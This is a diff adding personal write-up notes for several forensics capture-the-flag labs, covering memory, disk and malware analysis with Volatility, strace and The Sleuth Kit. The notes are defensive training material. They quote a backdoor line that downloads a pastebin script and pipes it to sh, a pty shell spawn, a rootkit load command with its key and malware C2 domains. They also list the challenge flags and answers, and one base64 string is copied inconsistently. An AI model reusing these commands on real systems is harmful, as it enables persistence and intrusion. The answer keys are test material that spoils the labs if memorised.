@@ -1,0 +1,1640 @@
+forensic 
+===============
+cyberdefenders: Seized Lab
+
+password: cyberdefenders.org
+
+https://en.wikipedia.org/wiki/CentOS#CentOS_version_7
+https://github.com/volatilityfoundation/dwarf2json
+
+Volatility 3 :Understand the common arguments 
+vol                    ->Starts Volatility 3
+-s                     ->Specifies the directory containing kernel symbol tables
+./vol3-symbols ->Your CentOS kernel ISF symbol directory
+-f	               -> Specifies the memory dump to investigate
+./dump.mem  ->The captured Linux memory image
+PLUGIN          -> The forensic operation you want to perform
+
+vol -s ./vol3-symbols -f ./dump.mem PLUGIN
+
+Plugin: banners.Banners
+Purpose:
+- Searches memory for Linux kernel banner strings.
+- Identifies the kernel version.
+- Helps identify the kernel build and architecture.
+
+Plugin: linux.bash.Bash
+Purpose:
+- Recovers Bash command history from memory.
+- Displays commands executed by users.
+- Helps identify attacker activity.
+
+Plugin: linux.pslist.PsList
+Purpose:
+- Enumerates processes present in memory.
+- Identifies process IDs and parent-child relationships.
+- Helps identify suspicious processes.
+
+Plugin: linux.sockstat.Sockstat
+Purpose:
+- Enumerates network sockets.
+- Identifies local and remote IP addresses.
+- Displays local and remote ports.
+- Shows connection states.
+
+
+Plugin: linux.psaux.PsAux
+Purpose:
+- Retrieves process command-line information.
+- Displays arguments supplied when processes were started.
+- Helps identify suspicious commands and execution techniques.
+
+
+Plugin: linux.proc.Maps
+Purpose:
+- Enumerates a process's virtual memory areas (VMAs).
+- Shows mapped memory regions.
+- Can dump the selected process's memory regions.
+
+
+Plugin: linux.lsmod.Lsmod
+Purpose:
+- Enumerates loaded Linux kernel modules.
+- Displays module names and memory information.
+- Helps investigate potentially malicious kernel modules.
+-------------------------
+What is the CentOS version installed on the machine?
+step 1: strings -a dump.mem | grep -iE 'CentOS.*release|Linux release'
+
+Linux 3.10.0-1062.el7.x86_64 CentOS Linux release 7.7.1908 (Core)
+3.10.0                        ->Linux kernel version
+1062                          ->CentOS kernel build/release number
+el7                             ->Enterprise Linux 7 family
+x86_64	                  -> 64-bit architecture
+centos.org build host ->CentOS kernel build origin
+
+step 2: verify
+
+https://en.wikipedia.org/wiki/CentOS
+ctrl+f -> 3.10.0-1062
+
+finally got : 7.7.1908
+
+
+-----------------
+There is a command containing a strange message in the bash history. Will you be able to read it?
+step 1: vol -s ./vol3-symbols -f ./dump.mem linux.bash.Bash
+
+┌──(root㉿kali)-[/home/kali/Documents/temp_extract_dir]
+└─# vol -s ./vol3-symbols -f ./dump.mem linux.bash.Bash
+Volatility 3 Framework 2.28.2
+Progress:  100.00               Stacking attempts finished           
+PID     Process CommandTime     Command
+
+2622    bash    2020-05-07 14:56:16.000000 UTC  cd Documents/
+2622    bash    2020-05-07 14:56:17.000000 UTC  echo "c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=" > y0ush0uldr34dth1s.txt
+
+
+step 2: echo 'c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=' | base64 -d
+
+shkCTF{l3ts_st4rt_th3_1nv3st_75cc55476f3dfe1629ac60}
+-----------------
+What is the PID of the suspicious process?
+
+step 1: vol -s ./vol3-symbols -f ./dump.mem linux.pslist.PsList
+
+Look for this process:
+PID    PPID    COMM
+2854   1       ncat
+
+
+-------------
+The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor?
+
+step 1:  vol -s ./vol3-symbols -f ./dump.mem linux.bash.Bash
+step 2: vol -s ./vol3-symbols -f ./dump.mem linux.bash.Bash | grep -i 'PythonBackup'
+
+
+2622ressbash00.02020-05-07 14:56:25.000000 UTCpt git clone https://github.com/tw0phi/PythonBackup
+" https://github.com/tw0phi/PythonBackup"
+step 3 : review code on repo and view path : app/snapshot.py 
+
+find the common keywords :
+dev ,null ,sh, os.system , https or http
+
+os.system('wget -O - https://pastebin.com/raw/nQwMKjtZ 2>/dev/null|sh')
+
+new page -> https://pastebin.com/raw/nQwMKjtZ
+
+### Congratz : base64 :c2hrQ1RGe3RoNHRfdzRzXzRfZHVtYl9iNGNrZDAwcl84NjAzM2MxOWUzZjM5MzE1YzAwZGNhfQo=
+echo 'c2hrQ1RGe3RoNHRfdzRzXzRfZHVtYl9iNGNrZDAwcl84NjAzM2MxOWUzZjM5MzE1YzAwZGNhfQo=' | base64 -d
+
+shkCTF{th4t_w4s_4_dumb_b4ckd00r_86033c19e3f39315c00dca}
+
+-----
+
+What are the attacker's IP address and the local port on the targeted machine?
+
+step 1:
+vol -s ./vol3-symbols -f ./dump.mem linux.sockstat.Sockstat | grep -i ncat
+
+Or filter by PID:
+
+step 2:
+vol -s ./vol3-symbols -f ./dump.mem linux.sockstat.Sockstat | grep 2854
+
+vol -s ./vol3-symbols -f ./dump.mem linux.sockstat.Sockstat | grep 2854
+4026531956 100.0ncat    2854    2854    4       0x9f60b42d45c0  AF_INET STREAM  TCP     192.168.49.135  12345   192.168.49.1    44122   ESTABLISHED     -
+
+Interpretation:
+Local IP -> 192.168.49.135 -> Victim machine
+Local port  -> 12345 -> Backdoor port
+Remote IP -> 192.168.49.1 -> Attacker
+Remote port ->44122 ->Attacker's source port
+Process	-> ncat/2854 ->Suspicious process
+
+answer: 192.168.49.1:12345
+----------------------
+
+
+What is the first command that the attacker executed?
+
+step 1: vol -s ./vol3-symbols -f ./dump.mem linux.psaux.PsAux 
+
+analysis "comm and args"
+2886    2876    python  python -c import pty; pty.spawn("/bin/bash")
+
+
+step 2: vol -s ./vol3-symbols -f ./dump.mem linux.psaux.PsAux | grep -Ei 'python|pty.spawn'
+2886    2876    python  python -c import pty; pty.spawn("/bin/bash")
+-----------
+
+After changing the user password, we found that the attacker still has access. Can you find out how?
+
+
+Identify the suspicious processes:
+PID     PPID    Process
+2886    2876    python
+2887    2886    bash
+3196    2887    vim
+
+
+step 1: mkdir -p dump
+
+step 2: vol -s ./vol3-symbols -f ./dump.mem -o ./dump linux.proc.Maps --pid 2887 --dump
+step 3: find dump -type f
+step 4: find dump -type f -name '*.dmp' -print0 | xargs -0 strings -a > strings.txt
+step 5: grep -aiE 'authorized_keys|rc.local|shkCTF' strings.txt
+step 6: mkdir -p vim-dump
+step 7:vol -s ./vol3-symbols -f ./dump.mem -o ./vim-dump linux.proc.Maps --pid 3196 --dump
+step 8: find vim-dump -type f -print0 | xargs -0 strings -a | grep -aiE 'authorized_keys|ssh-rsa|rc.local|tw0phi'
+
+Hidden message found
+#!/bin/sh
+# Well played : c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=
+
+Decode it
+echo 'c2hrQ1RGe3JjLmwwYzRsXzFzX2J1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=' | base64 -d
+
+shkCTF{rc.l0c4l_1s_funny_be2472cfaeed467ec9cab5b5a38e5fa0}
+
+--------------
+
+What is the name of the rootkit that the attacker used?
+
+step 1: vol -s ./vol3-symbols -f ./dump.mem linux.lsmod.Lsmod  
+step 2:  vol -s ./vol3-symbols -f ./dump.mem linux.lsmod.Lsmod | grep -i sysemptyrect
+
+sysemptyrect
+----------------
+
+---------------------
+The rootkit uses crc65 encryption. What is the key?
+
+step 1:  strings -a dump.mem | grep -i sysemptyrect
+step 2: insmod sysemptyrect.ko crc65_key="1337tibbartibbar"
+
+
+key : 1337tibbartibbar"
+---------------------
+
+===============
+
+
+
+
+
+
+
+
+=================
+RotaJakiro Lab
+
+-------
+1.What is the SHA256 hash of the file?
+step 1: sha256sum RotaJakiro.malware 
+d1cdeea8a081397632c0522476da2122f93c71cb14a36ad4e8d4351b3d65fd6d  RotaJakiro.malware
+-------
+
+-------
+2.What is the entry point address of the binary if the image base is 0x400000?
+step 1: readelf -h RotaJakiro.malware | grep 'Entry point' 
+-------
+
+-------
+3.How many sections in the file contain executable code?
+step 1: readelf -S RotaJakiro.malware 
+x or ax 
+-------
+
+-------
+4.Which system call/function does the binary use to obtain its absolute path?
+
+step 1: strace ./RotaJakiro.malware 
+step 2: copy all to paste 
+step 3: ctrl +f "readlink " 
+readlink("/proc/self/exe", "/home/kali/Documents/forensic /f"..., 4095) = 72
+
+/proc/self/exe → Symbolic link to the currently executing binary.
+readlink() → Reads the target path of that symbolic link.
+Result → Malware obtains its own absolute filesystem path.
+This strongly suggests the malware deleted its original executable after copying itself.
+
+Why does the original file disappear?
+unlink() removes a filesystem directory entry.
+
+
+
+answer :
+readlink
+
+
+Malware
+   |
+   v
+/proc/self/exe
+   |
+   v
+Linux symbolic link
+   |
+   v
+readlink()
+   |
+   v
+Returns executable's absolute path
+
+1.what is readlink ?
+readlink() is a Linux system call / C library function used to read the target of a symbolic link (symlink).
+realpath()	Resolves a pathname to its canonical absolute path
+readlinkat()	Reads a symbolic link relative to a directory file descriptor
+
+Linux has a special filesystem object called a symbolic link.
+
+2.What is /proc/self/exe ?
+/proc/
+   |
+   └── self/
+         |
+         └── exe
+
+/proc → Process information filesystem.
+self → Refers to the current process.
+exe → Symbolic link pointing to the executable currently running in that process.
+-------
+
+----------------
+5.As a persistence mechanism, the malware copies itself to two locations when executed by a regular, non root, user. What are the names of the new dropped binaries?
+
+step1 :strace -f ./RotaJakiro.malware 2>&1 | grep readlink
+
+┌──(kali㉿kali)-[~/Documents/forensic /files/temp_extract_dir]
+└─$ strace -f ./RotaJakiro.malware 2>&1 | grep readlink
+readlink("/proc/self/exe", "/home/kali/Documents/forensic /f"..., 4095) = 72
+readlink("/proc/self/exe", "/home/kali/.gvfsd/.profile/gvfsd"..., 4095) = 39
+ 
+step 2:                                                                                
+/home/kali/.gvfsd/.profile/
+
+step 3: ls
+gvfsd-helper
+
+
+or 
+step 1: strace ./RotaJakiro.malware 
+step 2: copy all to paste 
+step 3: ctrl +f "gvfsd-helper"  and ctrl +f " session-dbus" 
+
+
+openat(..., "/home/kali/.dbus/sessions/session-dbus", O_WRONLY|O_CREAT|O_TRUNC, ...)
+openat(..., "/home/kali/.gvfsd/.profile/gvfsd-helper", O_WRONLY|O_CREAT|O_TRUNC, ...)
+stat()
+chmod()
+openat()
+chmod()
+----
+
+----
+6.hich file does the malware modify to ensure it runs every time a terminal session is started?
+step 1:grep -nE 'gvfsd-helper|session-dbus' ~/.bashrc
+
+Explanation:
+.bashrc is a shell configuration file in a user's home directory.
+Bash reads it when an interactive non-login terminal session starts.
+Malware modifies it to execute its persistence command whenever a new interactive Bash session starts
+
+.bashrc
+-----
+
+----
+7.Which technique does the malware use to store strings before decrypting them?
+
+Stack strings
+
+What are stack strings?
+Stack strings are a technique where a program constructs strings directly in stack memory using instructions instead of storing them as readable strings in the binary.
+
+Encrypted string bytes
+        |
+        v
+Construct values on stack
+        |
+        v
+Call decryption function
+        |
+        v
+Decrypt string
+        |
+        v
+Use plaintext string
+
+Why malware uses this: It makes static string analysis harder because readable strings are not directly visible through tools such as strings
+
+----
+
+------
+8.What is the address of the function responsible for decrypting strings if the image base is 0x400000? This function is typically invoked right after each encrypted string is built on the stack.
+
+
+step 1: objdump -d -M intel RotaJakiro.malware | grep -i 'call'
+step 2: find  " 406f5a:       e8 21 bc ff ff          call   402b80 <socket@plt+0xe10>"
+step 3:
+
+objdump -d -M intel \
+--start-address=0x402b80 \
+--stop-address=0x402c50 \
+RotaJakiro.malware
+
+-
+0000000000402b80 <.text+0xe00>:
+  402b80: sub    rsp,0x28
+  402b84: mov    rax,QWORD PTR fs:0x28
+  402b8d: mov    QWORD PTR [rsp+0x18],rax
+
+This looks like a function prologue.
+sub rsp,0x28 – reserves stack space.
+fs:0x28 – accesses the stack canary.
+[rsp+0x18] – saves the canary value.
+
+402c20: movsx edi,BYTE PTR [r8]
+402c24: xor   edx,edx
+402c26: mov   esi,r9d
+402c29: call  402b00
+402c2e: mov   BYTE PTR [r8],al
+
+Reads one byte from the string.
+Passes that byte to 0x402b00.
+Receives a transformed byte in AL.
+Writes the transformed byte back into the buffer.
+
+This happens repeatedly in a loop.
+402c35: cmp r10,r8
+402c38: jne 402c20
+This is evidence of byte-by-byte string transformation.
+-
+answer : 0x402b80 "String decryption function address"
+----------
+
+---------
+9.Which system call/function is used by the malware to delete the original, first executed, file?
+
+step 1:strace ./RotaJakiro.malware
+step 2 : view unlink 
+unlink("/home/kali/Documents/forensic /files/temp_extract_dir/RotaJakiro.malware") = 0
+= 0 indicates successful deletion.
+
+what is unlink()?
+unlink() is a Linux system call used to remove a file's name from the filesystem.
+In RotaJakiro, the malware uses it to delete the original executable after creating its persistence copies.
+
+step 3: verify call on assembly
+objdump -d -M intel RotaJakiro.malware | grep 'unlink@plt'
+
+answer : unlink
+---------
+
+---------
+10.The malware decodes four embedded strings representing command-and-control (C2) domains. What are these domains?
+
+step 1: split terminal two 
+step 2: sudo tcpdump -ni any 'udp port 53 or tcp port 53' "onside of terminal another side terminal run the program -> run the program ./RotaJakiro.malware"
+
+0b3l1sk.me,cdn.mirror-codes.net,status.sublineover.net,blog.eduelects.com
+-----------
+==================
+
+
+=======
+Insider Lab
+ftk imager
+---
+setup
+step 1: open window search ftk imager run as administer
+step 2: left side top side corner file click 
+step 3 :add evidence item 
+step 4: select source -> image file -> select file via browse
+then finish 
+
+---
+---
+1.Which Linux distribution is being used on this machine?
+step 1:click expand -> horcruz 101: partition 5
+step 2: click root "you see boot directory"
+sep 3:click and you can view distro name
+
+config-4.13.0-kali1-amd64
+initrd.img-4.13.0-kali1-amd64
+initrd.img-4.13.0-kali1-amd64
+ans : kali
+
+---
+
+---
+2.What is the MD5 hash of the Apache access.log file?
+
+step 1: click var -> log -> apache 2 -> view file list 
+step 2:click access.log
+step 3:then check properties
+
+step 4: view verifiction hashes
+ans :d41d8cd98f00b204e9800998ecf8427e
+
+---
+
+---
+3.It is suspected that a credential dumping tool was downloaded. What is the name of the downloaded file?
+step 1: click root -> view file list -> click download -> view  mimikatz_trunk.zip
+
+ans : mimikatz_trunk.zip
+--
+----
+4.A super-secret file was created. What is the absolute path to this file?
+step 1: click root -> view file list -> click .bash_history ->view cmd all -.> /root/Desktop/SuperSecretFile.txt
+
+ans: /root/Desktop/SuperSecretFile.txt
+---
+
+---
+5.What program used the file didyouthinkwedmakeiteasy.jpg during its execution?
+step 1: click root -> view file list -> click .bash_history ->view cmd all
+
+ans:binwalk didyouthinkwedmakeiteasy.jpg 
+
+---
+
+---
+6.What is the third goal from the checklist Karen created?
+step 1: /root/Desktop/checklist "double click -> checklist " 
+
+Check List:
+
+- Gain Bob's Trust
+- Learn how to hack
+- Profit
+
+
+ans : profit 
+---
+
+---
+7.How many times was Apache run?
+step 1: /var/log/apache2/ -> click file apache2
+
+all have a size of 0 bytes, indicating that Apache was never run on this system.
+
+ans : 0
+
+---
+
+---
+8.This machine was used to launch an attack on another. Which file contains the evidence for this?
+step 1: /root
+step 2: view file's
+step 3: irZLAohL.jpeg
+
+screenshot is evidence
+ans: irZLAohL.jpeg
+
+---
+
+---
+9.It is believed that Karen was taunting a fellow computer expert through a bash script within the Documents directory. Who was the expert that Karen was taunting?
+
+step 1:/root/Documents/myfirsthack/
+step 2: open the firstscript_fixed bash script. It mentions the name indicating that Karen was taunting this individual.
+step 3:
+echo "Showing you your current path"
+pwd
+echo "Show my default route"
+ip route | grep --color default
+echo "Show network connections w/ port 80"
+netstat | grep --color 80
+echo "Heck yeah! I can write bash too Young"
+
+
+ans : young
+
+
+---
+
+---
+10.A user executed the su command to gain root access multiple times at 11:26. Who was the user?
+step 1: /var/log/auth.log
+step 2:view auth.log 
+step 3:11:26 to identify the user who switched to root.
+
+:26:22 KarenHacker su[4060]: Successful su for postgres by root
+Mar 20 11:26:22 KarenHacker su[4060]: + ??? root:postgres
+
+ans : postgres
+
+---
+
+---
+11.Based on the bash history, what is the current working directory?
+
+step 1: /root/ -> click the root and view  .bash_history -> view cmd "cd"
+ans: ./root/Documents/myfirsthack/
+--
+===========
+
+
+================
+Hammered Lab
+---
+1.Which service did the attackers use to gain access to the system?
+
+step 1: cat  auth.log
+step 2: grep -E "Accepted password|Failed password" auth.log 
+
+ans : ssh
+---
+
+---
+2.What is the operating system version of the targeted system?
+step 1:  grep "Linux version" dmesg | head
+
+ans : 4.2.4-1ubuntu3
+---
+
+---
+3.What is the name of the compromised account?
+
+step 1:cat auth.log | grep "uid"
+
+ans: root
+---
+
+---
+4.How many attackers, represented by unique IP addresses, were able to successfully access the system after initial failed attempts?
+
+step 1: 
+
+for ip in $(grep "Accepted password for root" auth.log | awk '{print $11}' | sort -u); do
+    count=$(grep "authentication failure" auth.log |
+            grep "user=root" |
+            grep -c "rhost=$ip ")
+
+    if [ "$count" -gt 10 ]; then
+        echo "$ip : $count"
+    fi
+done
+
+step 2: you saw the ips
+
+total: 6
+---
+
+---
+5.Which attacker's IP address successfully logged into the system the most number of times?
+
+step 1: 
+grep "Accepted password for root" auth.log |
+awk '
+$11=="219.150.161.20" ||
+$11=="222.66.204.246" ||
+$11=="121.11.66.70" ||
+$11=="222.169.224.197" ||
+$11=="122.226.202.12" ||
+$11=="61.168.227.12" {
+    count[$11]++
+}
+END {
+    for (ip in count)
+        print count[ip], ip
+}' | sort -nr
+
+step 2: answer: 219.150.161.20
+
+---
+
+---
+6.How many requests were sent to the Apache Server?
+
+step 1:apache2/www-access.log
+step 2:cat www-access.log | wc -l 
+---
+
+---
+7.How many rules have been added to the firewall?
+
+step 1: grep 'iptables' auth.log
+step 2: view all command are common used "COMMAND=/sbin/iptables -A INPUT -p    "
+
+ans: 6
+---
+
+---
+8.One of the downloaded files on the target system is a scanning tool. What is the name of the tool?
+
+step 1: apt/term.log
+step 2:cat term.log | grep "nmap"  
+
+ans: nmap
+---
+---
+9.When was the last login from the attacker with IP 219.150.161.20?
+
+step 1:stat auth.log
+step 2: lnav auth.log
+answer: 2010-04-19 05:56
+---
+
+---
+10.The database showed two warning messages. Please provide the most critical and potentially dangerous one.
+step 1: grep -i "WARNING" daemon.log
+step 2:grep -i "mysql" daemon.log | grep -i "WARNING"
+
+ans: mysql.user contains 2 root accounts without password!
+---
+
+
+---
+11.Multiple accounts were created on the target system. Which account was created on April 26 at 04:43:15?
+
+step 1: grep "useradd" auth.log | grep "Apr 26 04:43:15"
+ans: wind3str0y
+---
+
+
+--
+12.Few attackers were using a proxy to run their scans. What is the corresponding user-agent used by this proxy?
+
+Step 1 – Extract all User-Agent strings:
+awk -F'"' '{print $6}' apache2/www-access.log |
+sort | uniq -c | sort -nr
+
+Step 2 – Filter the suspicious proxy:
+grep -F '"pxyscand/2.1"' apache2/www-access.log
+
+Step 3 – Count its requests:
+grep -Fc '"pxyscand/2.1"' apache2/www-access.log
+--
+
+
+
+
+================
+
+
+
+
+=============
+Sleuthkit Apprentice
+===================
+
+Step 1: Extract the compressed disk image
+
+Command:
+gunzip -k disk.flag.img.gz
+
+Explanation:
+gunzip     -> Decompresses the .gz file.
+-k         -> Keeps the original compressed file.
+disk.flag.img.gz -> Input compressed disk image.
+
+Result:
+Creates disk.flag.img without deleting disk.flag.img.gz.
+
+
+Step 2: Examine the partition table
+
+Command:
+mmls disk.flag.img
+
+Explanation:
+mmls -> Displays the partition layout of the disk image.
+disk.flag.img -> Disk image to investigate.
+
+Purpose:
+Identifies the partitions and their starting sectors.
+
+Target partition offset:
+360448
+
+
+Step 3: Find flag files
+
+Command:
+fls -r -o 360448 disk.flag.img | grep -i flag
+
+Explanation:
+fls      -> Lists files and directories in the filesystem.
+-r       -> Recursively searches subdirectories.
+-o       -> Specifies the filesystem starting sector offset.
+360448   -> Starting sector of the target partition.
+disk.flag.img -> Disk image.
+|        -> Sends fls output to grep.
+grep     -> Searches text for a matching pattern.
+-i       -> Case-insensitive search.
+flag     -> Search keyword.
+
+Example output:
+r/r * 2082(realloc): flag.txt
+r/r 2371: flag.uni.txt
+
+Explanation:
+r/r      -> Regular file.
+2082     -> Metadata address (inode number).
+2371     -> Metadata address (inode number).
+*        -> Indicates a deleted file entry.
+flag.uni.txt -> Target filename.
+
+
+Step 4: Extract the file using its inode
+
+Command:
+icat -o 360448 disk.flag.img 2371
+
+Explanation:
+icat     -> Extracts file content using its inode number.
+-o       -> Specifies the filesystem starting sector offset.
+360448   -> Starting sector of the target partition.
+disk.flag.img -> Disk image.
+2371     -> Inode number of the target file.
+
+Purpose:
+Uses the inode to locate the file's data blocks and extract its content.
+
+Output:
+Displays the extracted file content in the terminal.
+
+
+Step 5: Save the extracted content into a file
+
+Command:
+icat -o 360448 disk.flag.img 2371 > flag.txt
+
+Explanation:
+>        -> Redirects command output into a file.
+flag.txt -> Saves the extracted content.
+
+Display the extracted content:
+
+cat flag.txt
+
+
+FORENSIC WORKFLOW
+=================
+
+Disk Image
+    |
+    v
+gunzip
+    |
+    v
+Extract Disk Image
+    |
+    v
+mmls
+    |
+    v
+Identify Partition
+    |
+    v
+fls
+    |
+    v
+List Files and Directories
+    |
+    v
+grep
+    |
+    v
+Find Flag Filename
+    |
+    v
+Identify Inode Number
+    |
+    v
+icat
+    |
+    v
+Extract File Content
+    |
+    v
+Recover Flag
+===========
+
+
+
+========================================================================================
+Disk, disk, sleuth! II
+=====================
+
+Category: Digital Forensics
+Tool: The Sleuth Kit (TSK)
+
+Objective:
+Find and recover the file named down-at-the-bottom.txt
+from the disk image and retrieve the flag.
+
+
+STEP 1: DOWNLOAD AND EXTRACT THE DISK IMAGE
+===========================================
+
+Commands:
+
+cd /tmp
+
+wget -O dds2-alpine.flag.img.gz 'https://challenge-files.cylabacademy.net/library/ade553d24cb44d6821915085413245390e7e9c9e24a9e8154b1a7f1bc02a8410/dds2-alpine.flag.img.gz'
+
+gunzip -k dds2-alpine.flag.img.gz
+
+ls -lh dds2-alpine.flag.img
+
+
+Command Explanation:
+
+cd /tmp
+    cd       -> Change Directory.
+    /tmp     -> Temporary directory in Linux.
+    Purpose  -> Move to /tmp to store the downloaded disk image.
+
+wget -O dds2-alpine.flag.img.gz URL
+    wget     -> Downloads files from the internet.
+    -O       -> Specifies the output filename.
+    dds2-alpine.flag.img.gz
+             -> Name of the downloaded compressed disk image.
+    URL      -> Source download address.
+    Purpose  -> Download the compressed disk image.
+
+gunzip -k dds2-alpine.flag.img.gz
+    gunzip   -> Decompresses a .gz file.
+    -k       -> Keeps the original compressed file.
+    .gz      -> Gzip compressed file extension.
+    Purpose  -> Extracts the actual disk image.
+
+ls -lh dds2-alpine.flag.img
+    ls       -> Lists files and directories.
+    -l       -> Long listing format.
+    -h       -> Human-readable file sizes (KB, MB, GB).
+    Purpose  -> Verifies that the extracted disk image exists.
+
+Result:
+    dds2-alpine.flag.img.gz -> Original compressed image.
+    dds2-alpine.flag.img    -> Extracted disk image.
+
+
+STEP 2: EXAMINE THE PARTITION TABLE
+===================================
+
+Command:
+
+mmls dds2-alpine.flag.img
+
+
+Command Explanation:
+
+mmls
+    -> Displays the partition layout of a disk image.
+
+dds2-alpine.flag.img
+    -> Disk image being investigated.
+
+Purpose:
+    Identifies partitions inside the disk image.
+    Displays each partition's starting sector,
+    ending sector, length and description.
+
+
+Actual Output:
+
+DOS Partition Table
+
+Slot    Start        End          Length       Description
+000     0000000000   0000000000   0000000001   Primary Table
+001     0000000000   0000002047   0000002048   Unallocated
+002     0000002048   0000262143   0000260096   Linux (0x83)
+
+
+Important Values:
+
+Start Sector : 2048
+End Sector   : 262143
+Length       : 260096
+Partition    : Linux (0x83)
+
+Why do we need 2048?
+
+    The disk image contains a Linux partition
+    starting at sector 2048.
+
+    We use this starting sector as the partition offset
+    in subsequent Sleuth Kit commands.
+
+    -o 2048 -> Tells Sleuth Kit where the filesystem starts.
+
+
+STEP 3: FIND THE TARGET FILENAME
+================================
+
+Challenge provides the filename:
+
+down-at-the-bottom.txt
+
+
+Command:
+
+fls -r -p -o 2048 dds2-alpine.flag.img | grep -i 'down-at-the-bottom.txt'
+
+
+Command Explanation:
+
+fls
+    -> Lists files and directories inside a filesystem.
+
+-r
+    -> Recursively searches subdirectories.
+    -> Searches files inside nested directories.
+
+-p
+    -> Displays the full path of files.
+
+-o 2048
+    -o       -> Specifies the filesystem starting sector offset.
+    2048     -> Starting sector of the Linux partition.
+
+dds2-alpine.flag.img
+    -> Disk image being investigated.
+
+|
+    -> Pipe operator.
+    -> Sends the output of fls to grep.
+
+grep
+    -> Searches text for a matching pattern.
+
+-i
+    -> Case-insensitive search.
+    -> Matches uppercase and lowercase characters.
+
+'down-at-the-bottom.txt'
+    -> Target filename we are searching for.
+
+
+Actual Output:
+
+r/r 18291: root/down-at-the-bottom.txt
+
+
+Output Explanation:
+
+r/r
+    -> Indicates a regular file.
+
+18291
+    -> Metadata address of the file.
+    -> Used to identify the file's metadata.
+
+root/
+    -> Directory containing the file.
+
+down-at-the-bottom.txt
+    -> Target filename.
+
+Important:
+    18291 is the metadata address returned by fls.
+    We use this address to extract the file contents.
+
+
+STEP 4: EXTRACT THE FILE USING ITS METADATA ADDRESS
+===================================================
+
+Command:
+
+icat -o 2048 dds2-alpine.flag.img 18291
+
+
+Command Explanation:
+
+icat
+    -> Extracts file contents using its metadata address.
+
+-o
+    -> Specifies the filesystem starting sector offset.
+
+2048
+    -> Starting sector of the Linux partition.
+
+dds2-alpine.flag.img
+    -> Original disk image.
+
+18291
+    -> Metadata address of down-at-the-bottom.txt.
+
+Purpose:
+    Uses the metadata address to locate the file's data.
+    Reads the file contents directly from the disk image.
+    Displays the recovered content in the terminal.
+
+
+Internal Working:
+
+Disk Image
+    |
+    v
+Partition Offset (2048)
+    |
+    v
+Linux Filesystem
+    |
+    v
+Metadata Address (18291)
+    |
+    v
+File Metadata Lookup
+    |
+    v
+Locate File Data Blocks
+    |
+    v
+Read File Contents
+    |
+    v
+Display Recovered Data
+
+
+Recovered Output:
+
+The file contains ASCII art.
+
+Characters inside parentheses:
+
+Row 1:
+(a) (c) (a) (d) (e) (m) (y) ({) (f) (0) (r) (3) (n)
+
+Row 2:
+(s) (1) (c) (4) (t) (0) (r) (_) (n) (0) (v) (1) (c)
+
+Row 3:
+(3) (_) (9) (5) (c) (6) (4) (5) (a) (d) (})
+
+
+Interpretation:
+
+    Read characters from left to right.
+    Continue from top to bottom.
+    Ignore the ASCII art formatting.
+    Combine all characters to reconstruct the flag.
+
+
+STEP 5: SAVE THE EXTRACTED CONTENT
+==================================
+
+Command:
+
+icat -o 2048 dds2-alpine.flag.img 18291 > recovered.txt
+
+
+Command Explanation:
+
+icat
+    -> Extracts file contents.
+
+-o 2048
+    -> Specifies the partition offset.
+
+dds2-alpine.flag.img
+    -> Original disk image.
+
+18291
+    -> Metadata address of the target file.
+
+>
+    -> Output redirection operator.
+    -> Sends command output into a file instead of the terminal.
+
+recovered.txt
+    -> Destination filename.
+    -> Stores the extracted file contents.
+
+Purpose:
+    Saves the recovered ASCII art into recovered.txt.
+
+
+STEP 6: DISPLAY THE RECOVERED CONTENT
+=====================================
+
+Command:
+
+cat recovered.txt
+
+
+Command Explanation:
+
+cat
+    -> Displays file contents in the terminal.
+
+recovered.txt
+    -> File containing the extracted ASCII art.
+
+Purpose:
+    Displays the recovered content.
+    Allows us to reconstruct the flag.
+
+
+FINAL RECOVERED FLAG
+====================
+
+academy{f0r3ns1c4t0r_n0v1c3_95c645ad}
+
+
+COMPLETE FORENSIC WORKFLOW
+==========================
+
+Compressed Disk Image
+        |
+        v
+       wget
+        |
+        v
+ Download Disk Image
+        |
+        v
+      gunzip
+        |
+        v
+ Extract Disk Image
+        |
+        v
+       mmls
+        |
+        v
+ Identify Linux Partition
+        |
+        v
+ Starting Sector = 2048
+        |
+        v
+       fls
+        |
+        v
+ List Files Recursively
+        |
+        v
+       grep
+        |
+        v
+ Find Target Filename
+        |
+        v
+ Identify Metadata Address
+        |
+        v
+       18291
+        |
+        v
+       icat
+        |
+        v
+ Extract File Contents
+        |
+        v
+   recovered.txt
+        |
+        v
+       cat
+        |
+        v
+ Read ASCII Art
+        |
+        v
+ Reconstruct Flag
+        |
+        v
+       FLAG
+
+
+QUICK COMMAND REFERENCE
+=======================
+
+cd       -> Change working directory.
+wget     -> Download disk image.
+gunzip   -> Decompress disk image.
+ls       -> Verify extracted image.
+mmls     -> Identify disk partitions.
+fls      -> List filesystem entries.
+grep     -> Search for target filename.
+icat     -> Extract file contents using metadata address.
+cat      -> Display recovered contents.
+>        -> Redirect output into a file.
+|        -> Pass output to another command.
+
+
+IMPORTANT FORENSIC CONCEPTS
+===========================
+
+1. PARTITION OFFSET (2048)
+   Identifies where the target filesystem starts
+   inside the disk image.
+
+2. METADATA ADDRESS (18291)
+   Identifies the file's filesystem metadata entry.
+   Used by icat to retrieve the file contents.
+
+3. ICAT
+   Extracts file contents directly from a disk image
+   using its metadata address.
+
+4. ASCII ART
+   The recovered file contains characters represented
+   using ASCII art. Reading those characters in order
+   reveals the flag.
+
+========================================================================================
+
+========================================================================================
+Operation Orchid
+
+step 1:
+wget -O disk.flag.img.gz 'https://challenge-files.cylabacademy.net/library/bb0cb9b59f754a578fdcff72400d49394fe4399b5bf0d34f650c5baffbad8575/disk.flag.img.gz'
+
+gunzip -k disk.flag.img.gz
+
+step 2:
+mmls disk.flag.img
+
+step 3:
+fls -o 411648 disk.flag.img 472
+
+step 4:Recover command history
+icat -o 411648 disk.flag.img 1875
+
+step 5:Recover encrypted data
+icat -o 411648 disk.flag.img 1782 > flag.txt.enc
+
+step 6:Decrypt the file
+openssl aes256 -d -salt \
+-in flag.txt.enc \
+-out flag.txt \
+-k 'unbreakablepassword1234567'
+
+step 7:Read the output
+cat flag.txt
+
+
+========================================================================================
+
+========================================================================================
+
+Operation Oni
+
+step 1: 
